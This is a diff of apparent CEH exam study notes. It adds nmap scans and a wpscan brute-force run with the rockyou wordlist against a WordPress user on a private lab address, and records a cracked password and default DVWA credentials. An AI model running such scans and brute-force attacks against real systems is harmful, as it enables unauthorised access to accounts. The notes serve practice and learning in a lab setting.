@@ -165,13 +165,16 @@ $firefox /root/.wapiti/generated_report/www.goodshoping.com_06092025.html
 Result: CSP = Content Security Policy (to help and mitigate XSS and data injection)
 
 -----------------------------------------------------------------------------------------------------------
-
 -Do a bruteforce attack on www.cehorg.com = 192.168.0.222 and find password for user adam:
+
+nmap -A 192.168.0.222 (detect WAMP SERVER on port 8080 = word press usually so browse :8080/CEH or/DVWA...)
 nmap -sC -sV 192.168.0.222
 nmap --open 192.168.0.222
 www.cehorg.com:8080 found, wamp server with DVWA but level impossible (admin:password) and wordpress found so:
+
 wpscan --usernames adam -P rockyou.txt --url http://192.168.0.222:8080/CEH/
 orange1234
+wpscan -U users.txt -P rockyou.txt --url http://192.168.0.222:8080/CEH/
 
 *You can also check http://192.168.0.222:8080/phpmyadmin/index.php
 
@@ -1622,6 +1625,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
